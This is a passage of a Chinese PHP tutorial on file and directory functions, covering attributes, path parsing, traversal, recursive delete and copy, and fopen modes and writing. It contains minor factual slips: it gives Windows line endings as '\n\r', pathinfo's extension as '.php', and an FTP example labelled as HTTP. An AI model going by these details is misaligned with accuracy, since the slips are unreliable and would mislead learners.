class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function getFilePro($fileName) &#123;     //声明一个函数，通过传入一个文件名称获取文件大部分属性</div><div class="line">		if(!file_exists($fileName)) &#123;     //如果提供的文件或目录不存在，则直接退出函数</div><div class="line">			echo &quot;目标文件不存在！！&lt;br&gt;&quot;;</div><div class="line">			return;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		if(is_file($fileName))          //判断是否是一个普通文件，如果是则条件成立</div><div class="line">			echo $fileName.&quot;是一个文件&lt;br&gt;&quot;;</div><div class="line">		if(is_dir($fileName))          //判断是否是一个目录，如果是则条件成立，输出下面语句</div><div class="line">			echo $fileName.&quot;是一个目录&lt;br&gt;&quot;;</div><div class="line"></div><div class="line">		echo &quot;文件型态：&quot;.getFileType($fileName).&quot;&lt;br&gt;&quot;;       //用定义的函数输出文件型态</div><div class="line">		echo &quot;文件大小：&quot;.getFileSize(filesize($fileName)).&quot;&lt;br&gt;&quot;; //获取文件大小，并自定义转换单位</div><div class="line">		</div><div class="line">		if(is_readable($fileName))     //判断提供的文件是否可以读取内容</div><div class="line">			echo &quot;文件可读&lt;br&gt;&quot;;</div><div class="line">	  	if(is_writable($fileName))     //判断提供的文件是否可以改写</div><div class="line">			echo &quot;文件可写&lt;br&gt;&quot;;</div><div class="line">		if(is_executable($fileName))   //判断提供的文件是否有执行的权限</div><div class="line">			echo &quot;文件可执行&lt;br&gt;&quot;;</div><div class="line"></div><div class="line">	  	echo &quot;文件建立时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,filectime($fileName)).&quot;&lt;br&gt;&quot;;</div><div class="line">		echo &quot;文件最后更动时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,filemtime($fileName)).&quot;&lt;br&gt;&quot;;</div><div class="line">		echo &quot;文件最后打开时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,fileatime($fileName)).&quot;&lt;br&gt;&quot;;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	function getFileType($fileName) &#123;    //声明一个函数用来返回文件的类型</div><div class="line">		switch(filetype($fileName))&#123;    //通过filetype()函数返回的文件类型做为选择的条件</div><div class="line">			case &apos;file&apos;:</div><div class="line">				$type.=&quot;普通文件&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;dir&apos;:</div><div class="line">				$type.=&quot;目录文件&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;block&apos;:</div><div class="line">				$type.=&quot;块设备文件&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;char&apos;:</div><div class="line">				$type.=&quot;字符设备文件&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;fifo&apos;:</div><div class="line">				$type.=&quot;命名管道文件&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;link&apos;:</div><div class="line">				$type.=&quot;符号链接&quot;;		</div><div class="line">				break;			</div><div class="line">			case &apos;unknown&apos;:</div><div class="line">				$type.=&quot;末知类型&quot;;		</div><div class="line">				break;	</div><div class="line">			default:</div><div class="line">				$type.=&quot;没有检测到类型&quot;;		</div><div class="line">		&#125;</div><div class="line">		return $type;        //返回转换后的类型</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	function getFileSize($bytes) &#123;        //自定义一个文件大小单位转换函数</div><div class="line">		if ($bytes &gt;= pow(2,40)) &#123;      //如果提供的字节数大于等于2的40次方，则条件成立</div><div class="line">			$return = round($bytes / pow(1024,4), 2);    //将字节大小转换为同等的T大小</div><div class="line">			$suffix = &quot;TB&quot;;                         //单位为TB</div><div class="line">		&#125; elseif ($bytes &gt;= pow(2,30)) &#123;  //如果提供的字节数大于等于2的30次方，则条件成立</div><div class="line">			$return = round($bytes / pow(1024,3), 2);    //将字节大小转换为同等的G大小</div><div class="line">			$suffix = &quot;GB&quot;;                         //单位为GB</div><div class="line">		&#125; elseif ($bytes &gt;= pow(2,20)) &#123;  //如果提供的字节数大于等于2的20次方，则条件成立</div><div class="line">			$return = round($bytes / pow(1024,2), 2);    //将字节大小转换为同等的M大小</div><div class="line">			$suffix = &quot;MB&quot;;                         //单位为MB</div><div class="line">		&#125; elseif ($bytes &gt;= pow(2,10)) &#123;  //如果提供的字节数大于等于2的10次方，则条件成立</div><div class="line">			$return = round($bytes / pow(1024,1), 2);    //将字节大小转换为同等的K大小</div><div class="line">			$suffix = &quot;KB&quot;;                         //单位为KB</div><div class="line">		&#125; else &#123;                     //否则提供的字节数小于2的10次方，则条件成立</div><div class="line">			$return = $bytes;                       //字节大小单位不变</div><div class="line">			$suffix = &quot;Byte&quot;;                       //单位为Byte</div><div class="line">		&#125;</div><div class="line">		return $return .&quot; &quot; . $suffix;                    //返回合适的文件大小和单位</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	getFilePro(&quot;file.php&quot;);  //调用自定义函数，将当前目录下的file.php文件传入，获取属性</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="目录的基本操作"><a href="#目录的基本操作" class="headerlink" title="目录的基本操作"></a>目录的基本操作</h2><h3 id="解析目录路径"><a href="#解析目录路径" class="headerlink" title="解析目录路径"></a>解析目录路径</h3><p>要描述一个文件的位置，可以使用绝对路径和相对路径。绝对路径是从根开始一级一级地进入各个子目录，最后指定该文件名或目录名。而相对路径是从当前目录进入某目录，最后指定该文件名或目录名。在系统的每个目录下都有两个特殊的目录“.”和“..”，分别指示当前目录和当前目录的父目录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$unixPath=&quot;/var/www/html/index.php&quot;;		//在UNIX系统中的绝对路径，必须使用“/”作为路径分隔符</div><div class="line">$winPath=&quot;C:\\Appserv\\www\\index.php&quot;;		//在Windows系统中的绝对路径，默认使用“\”作为路径分隔符</div><div class="line">$winPath=&quot;C:\\Appserv\\www\\index.php&quot;;		//在Windows系统中也接受使用“/”作为路径分隔符</div><div class="line">$fileName1=&quot;file.txt&quot;;			//相对路径，当前目录下的file.txt文件</div><div class="line">$fileName2=&quot;javascript/common.js&quot;;			//相对路径。当前路径中javascript子目录下的common.js文件</div><div class="line">$fileName3=&quot;../images/logo.gif&quot;;			//相对路径。上一级目录中images子目录下的logo.gif文件</div></pre></td></tr></table></figure></p>
<p>为了程序可以有很好的移植性，建议都使用“/”作为文件的路径分隔符。</p>
<h4 id="函数basename"><a href="#函数basename" class="headerlink" title="函数basename()"></a>函数basename()</h4><p>该函数给出一个包含有指向一个文件的全部路径的字符串，本函数返回基本的文件名。第二个参数是可选参数，规定文件的扩展名。如果提供了则不会输出这个扩展名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$path = &quot;/var/www/html/page.php&quot;;    //包含有指向一个文件的全路径的字符串</div><div class="line"></div><div class="line">	echo basename($path);             //显示带有文件扩展名的文件名，输出page.php</div><div class="line">	echo basename($path,&quot;.php&quot;);       //显示不带有文件扩展名的文件名，输出page</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数dirname"><a href="#函数dirname" class="headerlink" title="函数dirname()"></a>函数dirname()</h4><p>该函数只需要一个参数，给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$path = &quot;/var/www/html/page.php&quot;;  //包含有指向一个文件的全路径的字符串</div><div class="line"></div><div class="line">	echo dirname($path);              //返回目录名/var/www/html</div><div class="line">	echo dirname(&apos;c:/&apos;);                //返回目录名c:/</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数pathinfo"><a href="#函数pathinfo" class="headerlink" title="函数pathinfo()"></a>函数pathinfo()</h4><p>函数pathinfo()返回一个关联数组，其中包括指定路径中的目录名、基本名和扩展名三个部分。分别通过数组键dirname、basename和extension来引用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$path = &quot;/var/www/html/page.php&quot;;  //包含有指向一个文件的全路径的字符串</div><div class="line">	$path_parts=pathinfo($path);        //返回包括指定路径中的目录名、基本名和扩展名关联数组</div><div class="line">	echo $path_parts[&quot;dirname&quot;];        //输出目录名/var/www/html</div><div class="line">	echo $path_parts[&quot;basename&quot;];       //输出基本名page.php</div><div class="line">	echo $path_parts[&quot;extension&quot;];       //输出扩展名.php</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h3><p>在进行PHP编程的时候，需要对服务器某个目录下面的文件进行浏览，通常称为遍历目录。取得一个目录下的文件和子目录，就需要用到opendir()函数、readdir()函数、closedir()函数和rewinddir()函数。</p>
<ul>
<li>函数opendir()用于打开指定目录，接受一个目录的路径及目录名作为参数，函数返回值为可供其他目录函数使用的目录句柄。如果该目录不存在或没有访问权限，则返回FALSE。</li>
<li>函数readdir()用于读取指定目录，接受已经用opendir()函数打开的可操作目录句柄作为参数，函数返回当前目录指针位置的一个文件名，并将目录指针向后移动一位。当指针位于目录的结尾时，因为没有文件存在则返回FALSE。</li>
<li>函数closedir()关闭指定目录，接受已经用opendir()函数打开的可操作目录句柄作为参数。函数无返回值，运行后将关闭打开的目录。</li>
<li>函数rewinddir()倒回目录句柄，接收已经用opendir()函数打开的可操作目录句柄作为参数。将目录指针重置目录到开始处，即倒回目录开头。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$num=0;                          	//用来统计子目录和文件的个数</div><div class="line">	$dirname=&apos;phpMyAdmin&apos;;            	//定义一个变量，保存当前目录下用来遍历的一个目录名</div><div class="line">	$dir_handle=opendir($dirname);       	//用opendir打开目录</div><div class="line"></div><div class="line">     	//将遍历的目录和文件名使用表格格式输出</div><div class="line">	echo &apos;&lt;table border=&quot;0&quot; align=&quot;center&quot; width=&quot;600&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&apos;;</div><div class="line">	echo &apos;&lt;caption&gt;&lt;h2&gt;目录&apos;.$dirname.&apos;下面的内容&lt;/h2&gt;&lt;/caption&gt;&apos;;     //输出表格标题</div><div class="line">	echo &apos;&lt;tr align=&quot;left&quot; bgcolor=&quot;#cccccc&quot;&gt;&apos;;                        //输出表格的字段名</div><div class="line">	echo &apos;&lt;th&gt;文件名&lt;/th&gt;&lt;th&gt;文件大小&lt;/th&gt;&lt;th&gt;文件类型&lt;/th&gt;&lt;th&gt;修改时间&lt;/th&gt;&lt;/tr&gt;&apos;;</div><div class="line">	while($file=readdir($dir_handle)) &#123;    		//使用readdir循环读取目录里的内容</div><div class="line">		$dirFile=$dirname.&quot;/&quot;.$file;      	//将目录下的文件和当前目录连接起来，才能在程序中使用</div><div class="line">		if($num++%2==0)             		//隔行一种颜色，同时也将计数器num累加</div><div class="line">			$bgcolor=&apos;#ffffff&apos;;         	//单行为白色背景</div><div class="line">		else</div><div class="line">			$bgcolor=&apos;#cccccc&apos;;        	//双行为灰色背景</div><div class="line">		echo &apos;&lt;tr bgcolor=&apos;.$bgcolor.&apos;&gt;&apos;;            	//输出行开始标记，并使用背景色</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$file.&apos;&lt;/td&gt;&apos;;                   	//显示文件名</div><div class="line">         	echo &apos;&lt;td&gt;&apos;.filesize($dirFile).&apos;&lt;/td&gt;&apos;;         //显示文件大小</div><div class="line">         	echo &apos;&lt;td&gt;&apos;.filetype($dirFile).&apos;&lt;/td&gt;&apos;;         //显示文件类型</div><div class="line">         	echo &apos;&lt;td&gt;&apos;.date(&quot;Y/n/t&quot;,filemtime($dirFile)).&apos;&lt;/td&gt;&apos;;       //格式化显示文件修改时间</div><div class="line">         	echo &apos;&lt;/tr&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">	echo &apos;&lt;/table&gt;&apos;;                                     //关闭表格标记</div><div class="line">	closedir($dir_handle);                               //关闭文件操作句柄</div><div class="line"></div><div class="line">	echo &apos;在&lt;b&gt;&apos;.$dirname.&apos;&lt;/b&gt;目录下的子目录和文件共有&lt;b&gt;&apos;.$num.&apos;&lt;/b&gt;个&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="统计目录大小"><a href="#统计目录大小" class="headerlink" title="统计目录大小"></a>统计目录大小</h3><p>计算文件的大小可以通过filesize()函数完成，统计磁盘大小也可以使用disk_free_space()和disk_total_space()两个函数实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function dirSize($directory) &#123;     	//自定义一个函数dirSize()，统计传入参数的目录大小</div><div class="line">		$dir_size=0;              	//整型变量初值为0，用来累加各个文件大小从而计算目录大小</div><div class="line"></div><div class="line">		if($dir_handle=@opendir($directory)) &#123;           		//打开目录，并判断是否能成功打开</div><div class="line">			while($filename=readdir($dir_handle)) &#123;      		//循环遍历目录下的所有文件</div><div class="line">				if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;  	//一定要排除两个特殊的目录</div><div class="line">				    $subFile=$directory.&quot;/&quot;.$filename;   	//将目录下的子文件和当前目录相连</div><div class="line">					if(is_dir($subFile))               	//如果为目录</div><div class="line">						$dir_size+=dirSize($subFile);   //递归地调用自身函数，求子目录的大小</div><div class="line">					if(is_file($subFile))               	//如果是文件</div><div class="line">						$dir_size+=filesize($subFile);  //求出文件的大小并累加</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			closedir($dir_handle);                    //关闭文件资源</div><div class="line">			return $dir_size;                         //返回计算后的目录大小</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$dir_size=dirSize(&quot;phpMyAdmin&quot;);         	//调用该函数计算目录大小，返回目录大小的字节数</div><div class="line">	echo round($dir_size/pow(1024,1),2).&quot;KB&quot;;   	//将获取的目录字节数转换为“KB”单位并输出</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="建立和删除目录"><a href="#建立和删除目录" class="headerlink" title="建立和删除目录"></a>建立和删除目录</h3><p>在PHP中，使用mkdir()函数只需要传入一个目录名即可很容易地建立一个新目录。但删除目录所用的函数rmdir()，只能删除一个空目录并且目录必须存在。如果是非空的目录就需要先进入到路中，使用unlink()函数将目录中的每个文件都删除掉，再回来将这个空目录删除。如果目录中还存在子目录，而且子目录也非空，就要使用递归的方法了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function delDir($directory) &#123;         		//自定义函数递归的删除整个目录</div><div class="line">		if(file_exists($directory)) &#123;      	//判断目录是否存在，如果不存在rmdir()函数会出错</div><div class="line">			if($dir_handle=@opendir($directory)) &#123;      	//打开目录返回目录资源，并判断是否成功</div><div class="line">				while($filename=readdir($dir_handle)) &#123;  //遍历目录，读出目录中的文件或文件夹</div><div class="line">					if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;   	//一定要排除两个特殊的目录</div><div class="line">						$subFile=$directory.&quot;/&quot;.$filename;   	//将目录下的文件和当前目录相连</div><div class="line">						if(is_dir($subFile))                	//如果是目录条件则成立</div><div class="line">							delDir($subFile);             	//递归调用自己删除子目录</div><div class="line">						if(is_file($subFile))                	//如果是文件条件则成立</div><div class="line">							unlink($subFile);             	//直接删除这个文件</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				closedir($dir_handle);                       	//关闭目录资源</div><div class="line">				rmdir($directory);                          	//删除空目录</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	delDir(&quot;phpMyAdmin&quot;);  //调用delDir()函数，将程序所在目录中的“phpMyAdmin”文件夹删除</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="复制或移动目录"><a href="#复制或移动目录" class="headerlink" title="复制或移动目录"></a>复制或移动目录</h3><p>要赋值一个包含多级子目录的目录，将涉及文件的赋值、目录创建等操作。赋值一个文件可以通过PHP提供的copy()函数完成，创建目录可以使用mkdir()函数，定义函数时，首先对原木了进行遍历，如果遇到的是普通文件，直接使用copy()函数进行复制。如果遍历时遇到一个目录，则必须建立该目录，然后再对该目录下的文件进行复制操作，如果还有子目录，则使用递归重复操作，最终将整个目录复制完成。如果是移动目录，只需在遍历时将赋值后的文件或目录删除即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function copyDir($dirSrc, $dirTo) &#123;       //自定义函数递归的复制带有多级子目录的目录</div><div class="line">		if(is_file($dirTo)) &#123;               //如果目标不是一个目录，是一个已存在的文件则退出</div><div class="line">			echo &quot;目标不是目录不能创建!!&quot;;</div><div class="line">			return;                    //退出函数</div><div class="line">		&#125;</div><div class="line">		if(!file_exists($dirTo)) &#123;          //如果目标目录不存在则创建，存在则不变</div><div class="line">			mkdir($dirTo);             //创建目录目录</div><div class="line">		&#125;</div><div class="line">		if($dir_handle=@opendir($dirSrc)) &#123;           //打开目录返回目录资源，并判断是否成功</div><div class="line">			while($filename=readdir($dir_handle)) &#123;    //遍历目录，读出目录中的文件或文件夹</div><div class="line">				if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;     //一定要排除两个特殊的目录</div><div class="line">					$subSrcFile=$dirSrc.&quot;/&quot;.$filename;     //将源目录的多级子目录连接</div><div class="line">					$subToFile=$dirTo.&quot;/&quot;.$filename;      //将目标目录的多级子目录连接</div><div class="line">						</div><div class="line">					if(is_dir($subSrcFile))                    //如果源文件是一个目录</div><div class="line">						copyDir($subSrcFile, $subToFile);     //递归调用自己复制子目录</div><div class="line">					if(is_file($subSrcFile))                   //如果源文件是一个普通文件</div><div class="line">						copy($subSrcFile, $subToFile);       //直接复制到目标位置</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			closedir($dir_handle);       //关闭目录资源</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	copyDir(&quot;phpMyAdmin&quot;, &quot;D:/admin&quot;);   //测试函数，将目录&quot;phpMyAdmin&quot;复制到&quot;D:/admin&quot;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="文件的基本操作"><a href="#文件的基本操作" class="headerlink" title="文件的基本操作"></a>文件的基本操作</h2><h3 id="文件的打开与关闭"><a href="#文件的打开与关闭" class="headerlink" title="文件的打开与关闭"></a>文件的打开与关闭</h3><p>在PHP中可以通过标准函数fopen()建立与文件资源的连接，使用fclose()函数关闭通过fopen()函数打开的文件资源。</p>
<h4 id="函数fopen"><a href="#函数fopen" class="headerlink" title="函数fopen()"></a>函数fopen()</h4><p>该函数用来打开一个文件，并在打开一个文件时，还需要指定如何使用它。也就是以哪种文件模式打开文件资源。服务器上的操作系统文件必须知道对打开文件进行什么操作。操作系统需要了解在打开这个文件之后，这个文件是否允许其他的程序脚本再打开，还需要了解脚本的属主用户是否具有在这种方式下使用该文件的权限。该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource fopen(string filename,string mode[,bool use_include_path[,resource zcontext]])  //打开文件</div></pre></td></tr></table></figure></p>
<p>第一个参数需要提供要被打开文件的URL。这个URL可以是脚本所在的服务器中的绝对路径，也可以是相对路径，还可以是网络资源中的文件。<br>第二个参数需要提供文件模式，文件模式可以告诉操作系统如何处理来自其他人或脚本的访问请求，以及一种用来检查你是否有权访问这个特定文件的方法。当在打开文件时有三种选择：</p>
<ul>
<li>打开一个文件为了只读、只写或者是读和写。</li>
<li>如果要写一个文件，可以覆盖所有已有的文件内容，或者需要将新数据追加到文件末尾。</li>
<li>如果在一个区分二进制文件和纯文本文件的系统上写一个文件，还必须指定采用的方式。<br>函数fopen()也支持以上三种方式的组合，只需要在第二个参数中提供一个字符串，指定将对文件进行的操作即可。</li>
</ul>
<table>
<thead>
<tr>
<th>模式字符</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td style="text-align:left">只读方式打开文件，从文件开头开始读</td>
</tr>
<tr>
<td>r+</td>
<td style="text-align:left">读写方式打开文件，从文件开头开始读写</td>
</tr>
<tr>
<td>w</td>
<td style="text-align:left">只写方式打开文件，从文件开头开始写。如果文件已经存在，将文件指针指向文件头并将文件大小截为零，即删除所有文件已有的内容。如果该文件不存在，函数将创建这个文件</td>
</tr>
<tr>
<td>w+</td>
<td style="text-align:left">读写方式打开文件，从文件开头开始读写。如果文件已经存在，将文件指针指向文件头并将文件大小截为零，即删除所有文件已有的内容。如果文件不存在，函数将创建这个文件</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则fopen()调用失败并返回FALSE，并生成一条E_WARNING级别的错误信息。如果文件不存在则尝试创建之。仅能用于本地文件</td>
</tr>
<tr>
<td>x+</td>
<td style="text-align:left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则fopen()调用失败并返回FALSE，并生成一条E_WARNING级别的错误信息。如果文件不存在则尝试创建之。仅能用于本地文件</td>
</tr>
<tr>
<td>a</td>
<td style="text-align:left">写入方式打开，将文件指针指向文件末尾。如果该文件已有内容，将从该文件末尾开始追加。如果该文件不存在，函数将创建这个文件。</td>
</tr>
<tr>
<td>a+</td>
<td style="text-align:left">写入方式打开，将文件指针指向文件末尾。如果该文件已有内容，将从该文件末尾开始追加或读。如果该文件不存在，函数将创建这个文件。</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">以二进制模式打开文件，用于与其他模式进行连接。如果文件系统能够区分二进制文件和文本文件，你可能会使用它。例如在Windows系统中可以区分，而UNIX系统则不区分。这个模式是默认的模式</td>
</tr>
<tr>
<td>t</td>
<td style="text-align:left">以文本模式打开文件，这个模式也只是windows系统下一个选项，不推荐使用</td>
</tr>
</tbody>
</table>
<p>第三个参数是可选的，如果资源位于本地文件系统，PHP则认为可以使用本地路径或相对路径来访问资源。如果这个参数设置为1，这样就会使PHP考虑配置指令include_path中指定的路径。<br>第四个参数也是可选的，fopen()函数允许文件名称以协议名称开始，例如“<a href="http://”，并且在一个远程位置打开该文件。通过设置这个参数，还可以支持一些其他的协议。" target="_blank" rel="external">http://”，并且在一个远程位置打开该文件。通过设置这个参数，还可以支持一些其他的协议。</a><br>如果fopen()函数成功打开一个文件，该函数将返回一个指向这个文件的文件指针。对该文件进行操作所使用的读、写以及其他的文件操作函数，都要使用这个资源来访问该文件。如果打开文件失败，则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	//使用绝对路径打开file.txt文件，选择只读模式，并返回资源$handle</div><div class="line">	$handle = fopen(&quot;/home/rasmus/file.txt&quot;,&quot;r&quot;);</div><div class="line">	//访问文档根目录下的文件，也以只读模式打开</div><div class="line">	$handle = fopen(&quot;$_SERVER[&apos;DOCUMENT_ROOT&apos;]/data/info.txt&quot;,&quot;r&quot;);</div><div class="line">	//在Windows平台上，转义文件路径中的每个反斜线，或者用斜线，以二进制和只写模式组合</div><div class="line">	$handle = fopen(&quot;c:\\data\\file.gif&quot;,&quot;wb&quot;);</div><div class="line">	//使用相对路径打开file.txt文件，选择只读模式，并返回资源$handle</div><div class="line">	$handle = fopen(&quot;../data/info.txt&quot;,&quot;r&quot;);</div><div class="line">	//打开远程文件，使用HTTP协议只能以只读的模式打开</div><div class="line">	$handle = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);</div><div class="line">	//使用HTTP协议打开远程文件，如果FTP服务器可写，则可以以写的模式打开</div><div class="line">	$handle = fopen(&quot;ftp://user:password@example.com/somefile.txt&quot;,&quot;w&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数fclose"><a href="#函数fclose" class="headerlink" title="函数fclose()"></a>函数fclose()</h4><p>函数fclose()就会撤销fopen()打开的资源类型，成功时返回TRUE，否则返回FALSE。参数必须使用fopen()或fsockopen()函数打开的已存的文件指针。在目录操作中opendir()函数也是开启一个资源，使用closedir()将其关闭。</p>
<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>将程序中的数据保存到文件中比较容易，使用fwrite()函数就可以将字符串内容写入文件中。在文件中通过字符序列\n表示换行符，标识文件中一行的末尾。当需要一次输入或输出一行信息时，不同的操作系统具有不同的结束符号，基于UNIX的系统使用“\n”作为行结束字符，基于Windows的系统使用“\n\r”作为行结束字符，基于Macintosh的系统使用“\r”作为行结束字符。当要写入一个文本文件并想插入一个新行时，需要使用相应操作系统的行结束符号。函数fwrite()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int fwrite(resource handle,string string [,int length])			//写入文件</div></pre></td></tr></table></figure></p>
<p>第一个参数需要提供fopen()函数打开的文件资源，该函数将第二个参数提供的字符串内容输出到由第一个参数指定的资源中。如果给出了第三个可选参数length，fwrite()将在写入了length个字符时停止。否则将一直写入，直到到达内容结束时才停止。如果写入的内容少于length个字节，该函数也会在写完全部内容后停止。函数fwrite()执行完成以后会返回写入的字符数，出现错误时则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$fileName=&quot;data.txt&quot;;     //声明一个变量用来保存文件名		</div><div class="line">     	//使用fopen()函数以只写的模式打开文件，如果不存在则创建它，打开失败则通过程序</div><div class="line">	$handle = fopen($fileName, &apos;w&apos;) or die(&apos;打开&lt;b&gt;&apos;.$fileName.&apos;&lt;/b&gt;文件失败!!&apos;);</div><div class="line">	</div><div class="line">	for($row=0; $row&lt;10; $row++)                      //循环10次写入10行数据到文件中</div><div class="line">		fwrite($handle, $row.&quot;: www.lampbrother.net\n&quot;);	 //写入文件 </div><div class="line">		</div><div class="line">	fclose($handle);	         //关闭由fopen()打开的文件指针资源</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
